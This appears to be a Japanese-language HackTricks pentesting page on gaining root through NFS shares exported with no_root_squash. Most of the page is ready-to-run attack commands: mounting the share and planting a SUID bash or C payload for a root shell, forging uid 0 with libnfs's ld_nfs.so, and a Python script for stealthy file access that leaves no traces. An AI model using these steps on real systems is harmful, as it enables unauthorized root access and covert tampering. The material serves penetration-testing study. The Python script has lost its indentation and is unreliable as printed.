# NFS No Root Squash Misconfiguration による権限昇格

{{#include ../../banners/hacktricks-training.md}}

## Squashing の基本情報

NFS は通常（特に Linux では）、接続している client が指定した `uid` と `gid` を信頼してファイルへのアクセスを許可します（Kerberos が使用されていない場合）。ただし、server ではこの**動作を変更する**ために、いくつかの設定を行えます。

- **`all_squash`**: すべてのアクセスを squash し、すべての user と group を **`nobody`**（unsigned では 65534 / signed では -2）にマッピングします。したがって、全員が `nobody` となり、user は使用されません。
- **`root_squash`/`no_all_squash`**: これは Linux のデフォルトで、**uid 0（root）によるアクセスのみ**を squash します。したがって、任意の `UID` と `GID` は信頼されますが、`0` は `nobody` に squash されます（そのため root impersonation はできません）。
- **``no_root_squash`**: この設定を有効にすると、root user さえ squash されません。つまり、この設定で directory を mount すると、root としてアクセスできます。

**/etc/exports** ファイル内で **no_root_squash** として設定された directory を見つけた場合、client としてその directory に**アクセス**し、マシンの local **root** であるかのように、その directory **内に書き込む**ことができます。

**NFS** の詳細については、以下を確認してください。

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## 権限昇格

### Remote Exploit

bash を使用する Option 1:

- client マシンでその directory を **mount** し、**root として mounted folder 内に** **/bin/bash** binary をコピーして **SUID** 権限を付与し、**victim** マシン上でその bash binary を**実行**します。
- NFS share 内で root になるには、server で **`no_root_squash`** が設定されている必要があります。
- ただし、有効になっていない場合でも、binary を NFS share にコピーし、昇格させたい user として SUID permission を付与することで、別の user に権限昇格できる可能性があります。
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 using c compiled code:
- **そのディレクトリをマウント**した client machine で、**root としてマウントされたフォルダ内にコンパイル済みの payload をコピー**し、SUID permission を悪用して、その payload に **SUID** rights を付与し、victim machine からその binary を **execute**する（ここに[ C SUID payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)があります）。
- 先ほどと同じ restrictions
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Local Exploit

> [!TIP]
> 自分のマシンから被害者マシンへの **tunnel を作成できる場合、必要なポートを tunneling することで、Remote version を使用してこの privilege escalation を exploit できます**。\
> 次の trick は、ファイル `/etc/exports` が **IP** を示している場合に使用します。この場合、いかなる方法でも **remote exploit を使用できず**、この **trick を abuse する**必要があります。\
> exploit を動作させるために必要なもう1つの条件は、**`/etc/export` 内の export が** **`insecure` flag を使用していること**です。\
> --_`/etc/export` が IP address を示している場合に、この trick が動作するかどうかは確信がありません_--

### 基本情報

このシナリオでは、local machine に mount された NFS share を exploit し、client が自身の uid/gid を指定できる NFSv3 specification の flaw を利用して、unauthorized access を可能にします。exploit では、NFS RPC calls の forging を可能にする library である [libnfs](https://github.com/sahlberg/libnfs) を使用します。<sup>[[1]](#references)</sup>

#### Library のコンパイル

Library のコンパイル手順は、kernel version に応じて調整が必要になる場合があります。このケースでは、fallocate syscalls が comment out されました。コンパイルプロセスでは、次の commands を実行します。
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Exploitの実行

このExploitでは、権限をrootに昇格させてからshellを実行する単純なCプログラム（`pwn.c`）を作成します。プログラムをコンパイルし、RPC callsでuidを偽装する`ld_nfs.so`を使用して、生成されたbinary（`a.out`）をsuid root付きでshareに配置します。

1. **Exploit codeをコンパイル:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **uid を偽装して share 上に exploit を配置し、その権限を変更する:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **exploit を実行して root 権限を取得する:**
```bash
/mnt/share/a.out
#root
```
### Bonus: Stealthy File Access のための NFShell

root access を取得したら、所有者を変更せずに NFS share とやり取りするため（痕跡を残さないように）、Python script（nfsh.py）を使用します。この script は、アクセス対象の file の uid に一致するよう uid を調整し、permission の問題なく share 上の file とやり取りできるようにします。<sup>[[1]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
次のように実行:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## 参考文献

- [1] [あまり知られていない NFS privesc の話](https://www.errno.fr/nfs_privesc.html)

{{#include ../../banners/hacktricks-training.md}}
